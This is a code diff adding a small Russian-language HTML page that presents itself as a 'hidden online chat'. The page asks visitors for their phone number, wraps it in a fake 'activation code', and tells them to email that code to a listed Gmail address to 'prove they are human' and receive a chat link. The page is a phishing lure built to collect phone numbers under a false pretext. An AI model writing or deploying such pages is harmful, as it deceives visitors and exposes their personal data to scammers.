@@ -1,0 +1,40 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<meta charset="utf-8">
+	<title>Скрытый онлайн чат</title>
+</head>
+<body>
+<script type="text/javascript">
+	alert("Что бы включить чат надо написать номер!")
+</script>
+<center>
+	<form>
+	<h1>Введите номер чтобы открыть чат</h1><h5>(ваш номер не будет показан в чате)</h5>
+	<h5 id="vno">(Вводить правильный номер обязательно а не то чат не откроется!)</h5>
+<input id="nomer" type="number" name="quantity" placeholder="Номер" max="999999999" min="000000000">
+<input id="butt" type="button" value="Ok"/><br><br>
+<div id="obrobotka"></div>
+</form>
+</center>
+<script type="text/javascript">
+butt.onclick = function() {
+    var val = document.getElementById('nomer').value;
+    document.getElementById('obrobotka').innerHTML="Чтобы октивировать чат и доказать что вы человек надо отправить код на email itit45716@gmail.com после этого вам придёт ответ с ссылкой чата";
+    alert("Ваш код: !@nSkMH$#"+val+"#$&^&^&MHsk")
+};
+</script>
+<style type="text/css">
+	body{
+		background-image:url("https://images.unsplash.com/photo-1432847712612-926caafaa802?ixlib=rb-1.2.1&ixid=MXwxMjA3fDB8MHxleHBsb3JlLWZlZWR8Mnx8fGVufDB8fHw%3D&w=1000&q=80"); 
+	}
+	div{
+		color:white;
+		background-color:red;
+	}
+    h5#vno{
+    	background-color:red; 
+    }
+</style>
+</body>
+</html>
